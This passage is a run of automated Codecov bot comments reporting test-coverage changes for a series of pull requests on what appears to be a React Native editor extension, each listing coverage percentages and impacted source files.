0% <0%> (\u00f8) | :arrow_up: |\n| src/extension/extensionServer.ts | 0% <0%> (\u00f8) | :arrow_up: |\n| src/common/reactNative.ts | 0% <0%> (\u00f8) | :arrow_up: |\n| src/debugger/nodeDebugWrapper.ts | 3.78% <0%> (-0.12%) | :arrow_down: |\n| src/extension/commandPaletteHandler.ts | 0% <0%> (\u00f8) | :arrow_up: |\n| src/extension/settingsHelper.ts | 0% <0%> (\u00f8) | :arrow_up: |\n| src/common/remoteExtension.ts | 0% <0%> (\u00f8) | :arrow_up: |\n| src/extension/rn-extension.ts | 9.09% <100%> (-0.22%) | :arrow_down: |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 278d8e5...9de93f9. Read the comment docs.\n. # Codecov Report\nMerging #514 into master will increase coverage by 0.08%.\nThe diff coverage is 0%.\n\n\n```diff\n@@            Coverage Diff            @@\nmaster    #514      +/-\n=========================================\n+ Coverage     1.6%   1.68%   +0.08%   \n=========================================\n  Files          66      63       -3   \n  Lines        3359    3198     -161   \n  Branches      397     383      -14   \n=========================================\n  Hits           54      54            \n+ Misses       3305    3144     -161\n```\n| Impacted Files | Coverage \u0394 | |\n|---|---|---|\n| src/common/ios/iOSPlatform.ts | 0% <0%> (\u00f8) | |\n| src/extension/settingsHelper.ts | 0% <0%> (\u00f8) | :arrow_up: |\n| src/debugger/nodeDebugWrapper.ts | 3.87% <0%> (+0.08%) | :arrow_up: |\n| src/debugger/platformResolver.ts | 0% <0%> (\u00f8) | :arrow_up: |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update cbb0e86...7602f5e. Read the comment docs.\n. # Codecov Report\nMerging #515 into master will not change coverage.\nThe diff coverage is n/a.\n\n\n```diff\n@@          Coverage Diff           @@\nmaster    #515   +/-\n======================================\n  Coverage    1.69%   1.69%         \n======================================\n  Files          63      63         \n  Lines        3192    3192         \n  Branches      386     386         \n======================================\n  Hits           54      54         \n  Misses       3138    3138\n```\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 8022afd...4143ba7. Read the comment docs.\n. # Codecov Report\nMerging #516 into master will decrease coverage by <.01%.\nThe diff coverage is 0%.\n\n\n```diff\n@@            Coverage Diff            @@\nmaster    #516      +/-\n=========================================\n- Coverage    1.68%   1.68%   -0.01%   \n=========================================\n  Files          63      63            \n  Lines        3198    3200       +2   \n  Branches      383     384       +1   \n=========================================\n  Hits           54      54            \n- Misses       3144    3146       +2\n```\n| Impacted Files | Coverage \u0394 | |\n|---|---|---|\n| src/common/ios/iOSPlatform.ts | 0% <0%> (\u00f8) | :arrow_up: |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 8a67e14...d9e9233. Read the comment docs.\n. # Codecov Report\nMerging #517 into master will decrease coverage by <.01%.\nThe diff coverage is 0%.\n\n\n```diff\n@@            Coverage Diff            @@\nmaster    #517      +/-\n=========================================\n- Coverage    1.68%   1.68%   -0.01%   \n=========================================\n  Files          63      63            \n  Lines        3200    3206       +6   \n  Branches      384     388       +4   \n=========================================\n  Hits           54      54            \n- Misses       3146    3152       +6\n```\n| Impacted Files | Coverage \u0394 | |\n|---|---|---|\n| src/debugger/nodeDebugWrapper.ts | 3.9% <0%> (+0.03%) | :arrow_up: |\n| src/extension/commandPaletteHandler.ts | 0% <0%> (\u00f8) | :arrow_up: |\n| src/common/android/androidPlatform.ts | 0% <0%> (\u00f8) | :arrow_up: |\n| src/common/reactNative.ts | 0% <0%> (\u00f8) | :arrow_up: |\n| src/extension/settingsHelper.ts | 0% <0%> (\u00f8) | :arrow_up: |\n| src/common/ios/iOSPlatform.ts | 0% <0%> (\u00f8) | :arrow_up: |\n| src/common/extensionMessaging.ts | 0% <0%> (\u00f8) | :arrow_up: |\n| src/extension/extensionServer.ts | 0% <0%> (\u00f8) | :arrow_up: |\n| src/common/remoteExtension.ts | 0% <0%> (\u00f8) | :arrow_up: |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 8abbd16...da0fbea. Read the comment docs.\n. # Codecov Report\nMerging #519 into master will decrease coverage by <.01%.\nThe diff coverage is 0%.\n\n\n```diff\n@@            Coverage Diff            @@\nmaster    #519      +/-\n=========================================\n- Coverage    1.68%   1.68%   -0.01%   \n=========================================\n  Files          63      64       +1   \n  Lines        3206    3207       +1   \n  Branches      388     388            \n=========================================\n  Hits           54      54            \n- Misses       3152    3153       +1\n```\n| Impacted Files | Coverage \u0394 | |\n|---|---|---|\n| src/common/node/childProcess.ts | 0% <\u00f8> (\u00f8) | :arrow_up: |\n| src/common/error/errorStrings.ts | 0% <0%> (\u00f8) | |\n| src/common/error/errorHelper.ts | 0% <0%> (\u00f8) | :arrow_up: |\n| src/common/error/internalErrorCode.ts | 0% <0%> (\u00f8) | :arrow_up: |\n| src/common/ios/iOSPlatform.ts | 0% <0%> (\u00f8) | :arrow_up: |\n| src/extension/commandPaletteHandler.ts | 0% <0%> (\u00f8) | :arrow_up: |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 0db0be1...2cda69a. Read the comment docs.\n. # Codecov Report\nMerging #520 into master will not change coverage.\nThe diff coverage is n/a.\n\n\n```diff\n@@          Coverage Diff           @@\nmaster    #520   +/-\n======================================\n  Coverage    1.68%   1.68%         \n======================================\n  Files          64      64         \n  Lines        3207    3207         \n  Branches      388     388         \n======================================\n  Hits           54      54         \n  Misses       3153    3153\n```\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 3c172a0...9b18d06. Read the comment docs.\n. # Codecov Report\nMerging #522 into master will decrease coverage by 0.01%.\nThe diff coverage is 3.12%.\n\n\n```diff\n@@            Coverage Diff            @@\nmaster    #522      +/-\n=========================================\n- Coverage    1.68%   1.67%   -0.02%   \n=========================================\n  Files          64      64            \n  Lines        3209    3232      +23   \n  Branches      390     390            \n=========================================\n  Hits           54      54            \n- Misses       3155    3178      +23\n```\n| Impacted Files | Coverage \u0394 | |\n|---|---|---|\n| src/common/log/logHelper.ts | 0% <0%> (\u00f8) | :arrow_up: |\n| src/debugger/nodeDebugWrapper.ts | 3.9% <0%> (\u00f8) | :arrow_up: |\n| src/extension/outputChannelLogger.ts | 0% <0%> (\u00f8) | :arrow_up: |\n| src/common/entryPointHandler.ts | 0% <0%> (\u00f8) | :arrow_up: |\n| src/common/log/log.ts | 29.54% <33.33%> (-1.41%) | :arrow_down: |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update ed8367f...e80088f. Read the comment docs.\n. # Codecov Report\nMerging #523 into master will decrease coverage by <.01%.\nThe diff coverage is 0%.\n\n\n```diff\n@@            Coverage Diff            @@\nmaster    #523      +/-\n=========================================\n- Coverage    1.68%   1.68%   -0.01%   \n=========================================\n  Files          64      64            \n  Lines        3207    3209       +2   \n  Branches      388     390       +2   \n=========================================\n  Hits           54      54            \n- Misses       3153    3155       +2\n```\n| Impacted Files | Coverage \u0394 | |\n|---|---|---|\n| src/common/ios/iOSPlatform.ts | 0% <0%> (\u00f8) | :arrow_up: |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 678db27...5c491c7. Read the comment docs.\n. # Codecov Report\nMerging #524 into master will increase coverage by <.01%.\nThe diff coverage is 0%.\n\n\n```diff\n@@            Coverage Diff            @@\nmaster    #524      +/-\n=========================================\n+ Coverage    1.68%   1.68%   +<.01%   \n=========================================\n  Files          64      63       -1   \n  Lines        3209    3204       -5   \n  Branches      390     390            \n=========================================\n  Hits           54      54            \n+ Misses       3155    3150       -5\n```\n| Impacted Files | Coverage \u0394 | |\n|---|---|---|\n| src/common/generalMobilePlatform.ts | 0% <0%> (\u00f8) | :arrow_up: |\n| src/common/android/androidPlatform.ts | 0% <0%> (\u00f8) | :arrow_up: |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update ed8367f...f87b117. Read the comment docs.\n. # Codecov Report\nMerging #526 into master will increase coverage by <.01%.\nThe diff coverage is 0%.\n\n\n```diff\n@@            Coverage Diff            @@\nmaster    #526      +/-\n=========================================\n+ Coverage    1.68%   1.69%   +<.01%   \n=========================================\n  Files          64      63       -1   \n  Lines        3209    3192      -17   \n  Branches      390     386       -4   \n=========================================\n  Hits           54      54            \n+ Misses       3155    3138      -17\n```\n| Impacted Files | Coverage \u0394 | |\n|---|---|---|\n| src/common/android/androidPlatform.ts | 0% <0%> (\u00f8) | :arrow_up: |\n| src/extension/commandPaletteHandler.ts | 0% <0%> (\u00f8) | :arrow_up: |\n| src/common/remoteExtension.ts | 0% <0%> (\u00f8) | :arrow_up: |\n| src/extension/settingsHelper.ts | 0% <0%> (\u00f8) | :arrow_up: |\n| src/common/ios/iOSPlatform.ts | 0% <0%> (\u00f8) | :arrow_up: |\n| src/extension/extensionServer.ts | 0% <0%> (\u00f8) | :arrow_up: |\n| src/debugger/nodeDebugWrapper.ts | 3.87% <0%> (-0.04%) | :arrow_down: |\n| src/common/generalMobilePlatform.ts | 0% <0%> (\u00f8) | :arrow_up: |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update ed8367f...e39abca. Read the comment docs.\n. # Codecov Report\nMerging #527 into master will decrease coverage by 0.05%.\nThe diff coverage is 0%.\n\n\n```diff\n@@            Coverage Diff             @@\nmaster     #527      +/-\n==========================================\n- Coverage   36.02%   35.97%   -0.06%   \n==========================================\n  Files          63       63            \n  Lines        3192     3197       +5   \n  Branches      386      387       +1   \n==========================================\n  Hits         1150     1150            \n- Misses       2042     2047       +5\n```\n| Impacted Files | Coverage \u0394 | |\n|---|---|---|\n| src/common/packager.ts | 22.09% <0%> (-0.63%) | :arrow_down: |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 297822a...cd11c1f. Read the comment docs.\n. # Codecov Report\n:exclamation: No coverage uploaded for pull request base (master@2af998b). Click here to learn what that means.\nThe diff coverage is n/a.\n\n\n```diff\n@@            Coverage Diff            @@\nmaster     #528   +/-\n=========================================\n  Coverage          ?   36.02%         \n=========================================\n  Files             ?       63         \n  Lines             ?     3192         \n  Branches          ?      386         \n=========================================\n  Hits              ?     1150         \n  Misses            ?     2042         \n  Partials          ?        0\n```\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 2af998b...6596339. Read the comment docs.\n. # Codecov Report\nMerging #530 into master will decrease coverage by 19.89%.\nThe diff coverage is 9.51%.\n\n\n```diff\n@@            Coverage Diff             @@\nmaster     #530      +/-\n==========================================\n- Coverage   35.87%   15.98%   -19.9%   \n==========================================\n  Files          63       64       +1   \n  Lines        3222     3091     -131   \n  Branches      390      373      -17   \n==========================================\n- Hits         1156      494     -662   \n- Misses       2066     2597     +531\n```\n| Impacted Files | Coverage \u0394 | |\n|---|---|---|\n| src/extension/android/packageNameResolver.ts | 0% <\u00f8> (\u00f8) | |\n| src/extension/android/adb.ts | 0% <\u00f8> (\u00f8) | |\n| src/extension/ios/simulatorPlist.ts | 0% <\u00f8> (\u00f8) | |\n| src/extension/android/logCatMonitor.ts | 0% <0%> (\u00f8) | :arrow_up: |\n| src/extension/exponent/exponentHelper.ts | 0% <0%> (\u00f8) | |\n| src/extension/commandPaletteHandler.ts | 0% <0%> (\u00f8) | :arrow_up: |\n| src/extension/exponent/xdlInterface.ts | 22.03% <0%> (\u00f8) | |\n| src/extension/ios/plistBuddy.ts | 0% <0%> (\u00f8) | |\n| src/extension/settingsHelper.ts | 2.27% <0%> (+2.27%) | :arrow_up: |\n| src/extension/log/OutputChannelLogger.ts | 0% <0%> (\u00f8) | |\n| ... and 59 more | |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update b57ea01...f9e89c3. Read the comment docs.\n. # Codecov Report\nMerging #532 into master will increase coverage by <.01%.\nThe diff coverage is 62.5%.\n\n\n```diff\n@@            Coverage Diff             @@\nmaster     #532      +/-\n==========================================\n+ Coverage   35.97%   35.97%   +<.01%   \n==========================================\n  Files          63       63            \n  Lines        3197     3202       +5   \n  Branches      387      389       +2   \n==========================================\n+ Hits         1150     1152       +2   \n- Misses       2047     2050       +3\n```\n| Impacted Files | Coverage \u0394 | |\n|---|---|---|\n| src/common/generalMobilePlatform.ts | 43.47% <100%> (+5.38%) | :arrow_up: |\n| src/common/ios/iOSPlatform.ts | 50.66% <100%> (-1.29%) | :arrow_down: |\n| src/common/android/androidPlatform.ts | 82.97% <40%> (-2.42%) | :arrow_down: |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 7f9bca9...e86ea2d. Read the comment docs.\n. # Codecov Report\nMerging #535 into master will not change coverage.\nThe diff coverage is n/a.\n\n\n```diff\n@@           Coverage Diff           @@\nmaster     #535   +/-\n=======================================\n  Coverage   35.97%   35.97%         \n=======================================\n  Files          63       63         \n  Lines        3202     3202         \n  Branches      389      389         \n=======================================\n  Hits         1152     1152         \n  Misses       2050     2050\n```\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 1ca47c7...dc0c0dd. Read the comment docs.\n. # Codecov Report\nMerging #536 into master will decrease coverage by 0.09%.\nThe diff coverage is 29.16%.\n\n\n```diff\n@@            Coverage Diff            @@\nmaster     #536     +/-\n=========================================\n- Coverage   35.97%   35.87%   -0.1%   \n=========================================\n  Files          63       63           \n  Lines        3202     3222     +20   \n  Branches      389      390      +1   \n=========================================\n+ Hits         1152     1156      +4   \n- Misses       2050     2066     +16\n```\n| Impacted Files | Coverage \u0394 | |\n|---|---|---|\n| src/extension/rn-extension.ts | 9.09% <0%> (\u00f8) | :arrow_up: |\n| src/common/generalMobilePlatform.ts | 38.46% <0%> (-5.02%) | :arrow_down: |\n| src/extension/commandPaletteHandler.ts | 0% <0%> (\u00f8) | :arrow_up: |\n| src/common/android/adb.ts | 27.53% <0%> (-2.98%) | :arrow_down: |\n| src/common/android/androidPlatform.ts | 82.47% <42.85%> (-0.51%) | :arrow_down: |\n| src/common/ios/iOSPlatform.ts | 51.31% <72.72%> (+0.64%) | :arrow_up: |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 7c2a5d2...2ffc403. Read the comment docs.\n. # Codecov Report\nMerging #544 into master will decrease coverage by 2.61%.\nThe diff coverage is 13.71%.\n\n\n```diff\n@@            Coverage Diff             @@\nmaster     #544      +/-\n==========================================\n- Coverage   15.98%   13.36%   -2.62%   \n==========================================\n  Files          64       63       -1   \n  Lines        3091     3082       -9   \n  Branches      373      370       -3   \n==========================================\n- Hits          494      412      -82   \n- Misses       2597     2670      +73\n```\n| Impacted Files | Coverage \u0394 | |\n|---|---|---|\n| src/extension/extensionServer.ts | 3.25% <0%> (+0.41%) | :arrow_up: |\n| src/extension/ios/iOSPlatform.ts | 0% <0%> (\u00f8) | :arrow_up: |\n| src/extension/commandPaletteHandler.ts | 0% <0%> (\u00f8) | :arrow_up: |\n| src/debugger/nodeDebugWrapper.ts | 3.33% <0%> (\u00f8) | :arrow_up: |\n| src/extension/android/adb.ts | 0% <0%> (\u00f8) | :arrow_up: |\n| src/common/hostPlatform.ts | 28.75% <0%> (\u00f8) | :arrow_up: |\n| src/extension/rn-extension.ts | 8.23% <0%> (-0.2%) | :arrow_down: |\n| src/extension/android/androidPlatform.ts | 0% <0%> (\u00f8) | :arrow_up: |\n| src/debugger/appWorker.ts | 76.85% <100%> (+0.21%) | :arrow_up: |\n| src/common/extensionMessaging.ts | 100% <100%> (\u00f8) | :arrow_up: |\n| ... and 8 more | |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 0a68f8d...82a901e. Read the comment docs.\n. # Codecov Report\nMerging #548 into master will not change coverage.\nThe diff coverage is 0%.\n\n\n```diff\n@@           Coverage Diff           @@\nmaster     #548   +/-\n=======================================\n  Coverage   13.36%   13.36%         \n=======================================\n  Files          63       63         \n  Lines        3082     3082         \n  Branches      370      371    +1   \n=======================================\n  Hits          412      412         \n  Misses       2670     2670\n```\n| Impacted Files | Coverage \u0394 | |\n|---|---|---|\n| src/debugger/nodeDebugWrapper.ts | 3.33% <0%> (\u00f8) | :arrow_up: |\n| src/extension/extensionServer.ts | 3.25% <0%> (\u00f8) | :arrow_up: |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 7daed3f...4226753. Read the comment docs.\n. # Codecov Report\nMerging #549 into master will not change coverage.\nThe diff coverage is n/a.\n\n\n```diff\n@@           Coverage Diff           @@\nmaster     #549   +/-\n=======================================\n  Coverage   13.36%   13.36%         \n=======================================\n  Files          63       63         \n  Lines        3082     3082         \n  Branches      371      371         \n=======================================\n  Hits          412      412         \n  Misses       2670     2670\n```\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 748105d...65ae0ed. Read the comment docs.\n. # Codecov Report\nMerging #551 into master will increase coverage by 0.72%.\nThe diff coverage is 78.72%.\n\n\n```diff\n@@            Coverage Diff             @@\nmaster     #551      +/-\n==========================================\n+ Coverage   13.36%   14.09%   +0.72%   \n==========================================\n  Files          63       63            \n  Lines        3082     3101      +19   \n  Branches      371      373       +2   \n==========================================\n+ Hits          412      437      +25   \n+ Misses       2670     2664       -6\n```\n| Impacted Files | Coverage \u0394 | |\n|---|---|---|\n| src/debugger/nodeDebugWrapper.ts | 3.33% <0%> (\u00f8) | :arrow_up: |\n| src/debugger/forkedAppWorker.ts | 86.56% <100%> (+12.42%) | :arrow_up: |\n| src/debugger/sourceMap.ts | 91.3% <100%> (+0.82%) | :arrow_up: |\n| src/common/packagerStatus.ts | 33.33% <50%> (\u00f8) | :arrow_up: |\n| src/debugger/scriptImporter.ts | 32.72% <57.14%> (+3.88%) | :arrow_up: |\n| src/debugger/appWorker.ts | 77.47% <81.81%> (+0.62%) | :arrow_up: |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 1c53023...16b99bc. Read the comment docs.\n. # Codecov Report\nMerging #554 into master will not change coverage.\nThe diff coverage is n/a.\n\n\n```diff\n@@           Coverage Diff           @@\nmaster     #554   +/-\n=======================================\n  Coverage   14.09%   14.09%         \n=======================================\n  Files          63       63         \n  Lines        3101     3101         \n  Branches      373      373         \n=======================================\n  Hits          437      437         \n  Misses       2664     2664\n```\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 6eeec3c...3410791. Read the comment docs.\n. # Codecov Report\nMerging #556 into master will increase coverage by 0.63%.\nThe diff coverage is 2.89%.\n\n\n```diff\n@@            Coverage Diff             @@\nmaster     #556      +/-\n==========================================\n+ Coverage   14.09%   14.72%   +0.63%   \n==========================================\n  Files          63       61       -2   \n  Lines        3101     2995     -106   \n  Branches      373      364       -9   \n==========================================\n+ Hits          437      441       +4   \n+ Misses       2664     2554     -110\n```\n| Impacted Files | Coverage \u0394 | |\n|---|---|---|\n| src/debugger/reactNativeDebugEntryPoint.ts | 5.55% <\u00f8> (+0.15%) | :arrow_up: |\n| src/extension/extensionServer.ts | 3.12% <0%> (-0.13%) | :arrow_down: |\n| src/extension/ios/iOSPlatform.ts | 0% <0%> (\u00f8) | :arrow_up: |\n| src/extension/exponent/exponentPlatform.ts | 0% <0%> (\u00f8) | :arrow_up: |\n| src/common/entryPointHandler.ts | 0% <0%> (\u00f8) | :arrow_up: |\n| src/extension/commandPaletteHandler.ts | 0% <0%> (\u00f8) | :arrow_up: |\n| src/debugger/nodeDebugWrapper.ts | 3.33% <0%> (\u00f8) | :arrow_up: |\n| src/extension/exponent/exponentHelper.ts | 0% <0%> (\u00f8) | :arrow_up: |\n| src/common/packager.ts | 0% <0%> (\u00f8) | :arrow_up: |\n| src/extension/openFileAtLocation.ts | 5.12% <0%> (+0.12%) | :arrow_up: |\n| ... and 8 more | |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 600e4a2...c6f84c8. Read the comment docs.\n. # Codecov Report\nMerging #558 into master will not change coverage.\nThe diff coverage is 0%.\n\n\n```diff\n@@           Coverage Diff           @@\nmaster     #558   +/-\n=======================================\n  Coverage   14.09%   14.09%         \n=======================================\n  Files          63       63         \n  Lines        3101     3101         \n  Branches      373      373         \n=======================================\n  Hits          437      437         \n  Misses       2664     2664\n```\n| Impacted Files | Coverage \u0394 | |\n|---|---|---|\n| src/extension/extensionServer.ts | 3.25% <0%> (\u00f8) | :arrow_up: |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 7100cfc...cd4acc5. Read the comment docs.\n. # Codecov Report\nMerging #563 into master will decrease coverage by 0.04%.\nThe diff coverage is 0%.\n\n\n```diff\n@@            Coverage Diff             @@\nmaster     #563      +/-\n==========================================\n- Coverage   14.72%   14.68%   -0.05%   \n==========================================\n  Files          61       61            \n  Lines        2995     3004       +9   \n  Branches      364      366       +2   \n==========================================\n  Hits          441      441            \n- Misses       2554     2563       +9\n```\n| Impacted Files | Coverage \u0394 | |\n|---|---|---|\n| src/extension/android/androidPlatform.ts | 0% <0%> (\u00f8) | :arrow_up: |\n| src/extension/generalMobilePlatform.ts | 0% <0%> (\u00f8) | :arrow_up: |\n| src/extension/ios/iOSPlatform.ts | 0% <0%> (\u00f8) | :arrow_up: |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 74572dc...377a189. Read the comment docs.\n. # Codecov Report\nMerging #564 into master will not change coverage.\nThe diff coverage is n/a.\n\n\n```diff\n@@           Coverage Diff           @@\nmaster     #564   +/-\n=======================================\n  Coverage   14.68%   14.68%         \n=======================================\n  Files          61       61         \n  Lines        3004     3004         \n  Branches      366      366         \n=======================================\n  Hits          441      441         \n  Misses       2563     2563\n```\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 173fbae...9bd0a01. Read the comment docs.\n. # Codecov Report\nMerging #565 into master will not change coverage.\nThe diff coverage is 100%.\n\n\n```diff\n@@           Coverage Diff           @@\nmaster     #565   +/-\n=======================================\n  Coverage   14.68%   14.68%         \n=======================================\n  Files          61       61         \n  Lines        3004     3004         \n  Branches      366      366         \n=======================================\n  Hits          441      441         \n  Misses       2563     2563\n```\n| Impacted Files | Coverage \u0394 | |\n|---|---|---|\n| src/debugger/sourceMapsCombinator.ts | 94.23% <100%> (\u00f8) | :arrow_up: |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 89943e0...39f6fc0. Read the comment docs.\n. # Codecov Report\nMerging #568 into master will decrease coverage by <.01%.\nThe diff coverage is 0%.\n\n\n```diff\n@@            Coverage Diff             @@\nmaster     #568      +/-\n==========================================\n- Coverage   14.68%   14.67%   -0.01%   \n==========================================\n  Files          61       61            \n  Lines        3004     3005       +1   \n  Branches      366      366            \n==========================================\n  Hits          441      441            \n- Misses       2563     2564       +1\n```\n| Impacted Files | Coverage \u0394 | |\n|---|---|---|\n| src/extension/extensionServer.ts | 3.1% <0%> (-0.03%) | :arrow_down: |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 8ec0254...4ea85e8. Read the comment docs.\n. # Codecov Report\nMerging #571 into master will not change coverage.\nThe diff coverage is n/a.\n\n\n```diff\n@@           Coverage Diff           @@\nmaster     #571   +/-\n=======================================\n  Coverage   14.67%   14.67%         \n=======================================\n  Files          61       61         \n  Lines        3005     3005         \n  Branches      366      366         \n=======================================\n  Hits          441      441         \n  Misses       2564     2564\n```\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update a18a84b...c7edb6f. Read the comment docs.\n. # Codecov Report\n:exclamation: No coverage uploaded for pull request base (master@dbecc52). Click here to learn what that means.\nThe diff coverage is 0%.\n\n\n```diff\n@@            Coverage Diff            @@\nmaster     #573   +/-\n=========================================\n  Coverage          ?   14.68%         \n=========================================\n  Files             ?       61         \n  Lines             ?     3004         \n  Branches          ?      366         \n=========================================\n  Hits              ?      441         \n  Misses            ?     2563         \n  Partials          ?        0\n```\n| Impacted Files | Coverage \u0394 | |\n|---|---|---|\n| src/extension/rn-extension.ts | 10% <0%> (\u00f8) | |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update dbecc52...0c55783. Read the comment docs.\n. # Codecov Report\nMerging #574 into master will not change coverage.\nThe diff coverage is 0%.\n\n\n```diff\n@@           Coverage Diff           @@\nmaster     #574   +/-\n=======================================\n  Coverage   14.68%   14.68%         \n=======================================\n  Files          61       61         \n  Lines        3004     3004         \n  Branches      366      366         \n=======================================\n  Hits          441      441         \n  Misses       2563     2563\n```\n| Impacted Files | Coverage \u0394 | |\n|---|---|---|\n| src/extension/rn-extension.ts | 10% <0%> (\u00f8) | :arrow_up: |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 1d0438f...2f90369. Read the comment docs.\n. # Codecov Report\nMerging #575 into master will not change coverage.\nThe diff coverage is n/a.\n\n\n```diff\n@@           Coverage Diff           @@\nmaster     #575   +/-\n=======================================\n  Coverage   14.68%   14.68%         \n=======================================\n  Files          61       61         \n  Lines        3004     3004         \n  Branches      366      366         \n=======================================\n  Hits          441      441         \n  Misses       2563     2563\n```\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update d32a5f9...9795600. Read the comment docs.\n. # Codecov Report\nMerging #579 into master will not change coverage.\nThe diff coverage is n/a.\n\n\n```diff\n@@           Coverage Diff           @@\nmaster     #579   +/-\n=======================================\n  Coverage   14.68%   14.68%         \n=======================================\n  Files          61       61         \n  Lines        3004     3004         \n  Branches      366      366         \n=======================================\n  Hits          441      441         \n  Misses       2563     2563\n```\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update b92d993...7fcd5ad. Read the comment docs.\n. # Codecov Report\nMerging #582 into master will increase coverage by 0.93%.\nThe diff coverage is 22.22%.\n\n\n```diff\n@@            Coverage Diff             @@\nmaster     #582      +/-\n==========================================\n+ Coverage   14.68%   15.61%   +0.93%   \n==========================================\n  Files          61       61            \n  Lines        3004     3010       +6   \n  Branches      367      368       +1   \n==========================================\n+ Hits          441      470      +29   \n+ Misses       2563     2540      -23\n```\n| Impacted Files | Coverage \u0394 | |\n|---|---|---|\n| src/debugger/appWorker.ts | 77.47% <0%> (\u00f8) | :arrow_up: |\n| src/debugger/scriptImporter.ts | 32.78% <25%> (+0.05%) | :arrow_up: |\n| src/extension/log/NullLogger.ts | 14.28% <0%> (+14.28%) | :arrow_up: |\n| src/common/commandExecutor.ts | 14.67% <0%> (+14.67%) | :arrow_up: |\n| src/common/reactNativeProjectHelper.ts | 41.66% <0%> (+41.66%) | :arrow_up: |\n| src/common/node/node.ts | 100% <0%> (+100%) | :arrow_up: |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 9a36437...482e553. Read the comment docs.\n. # Codecov Report\nMerging #583 into master will not change coverage.\nThe diff coverage is 0%.\n\n\n```diff\n@@           